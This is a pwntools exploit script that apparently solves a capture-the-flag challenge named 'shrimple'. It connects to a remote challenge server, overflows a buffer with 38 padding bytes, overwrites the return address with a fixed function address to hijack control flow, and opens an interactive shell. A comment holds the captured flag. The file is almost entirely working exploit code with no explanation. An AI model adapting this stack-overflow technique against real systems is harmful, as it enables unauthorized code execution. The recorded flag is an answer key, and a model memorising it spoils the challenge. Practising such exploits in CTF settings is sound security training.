from pwn import *

bin = './shrimple'
elf = context.binary = ELF(bin)

#p = process(bin)
p = remote('chal.competitivecyber.club', 8884)
#gdb.attach(p, 'b *main+253')
payload = b'A'*38 + p64(0x0401282)

p.sendlineafter(b'>>', b'A'*42)
p.sendlineafter(b'>>', b'A'*41)
p.sendlineafter(b'>>', payload)

#MOVAPS CRINGE!
p.interactive()
#pctf{ret_2_shr1mp_90cbba754f}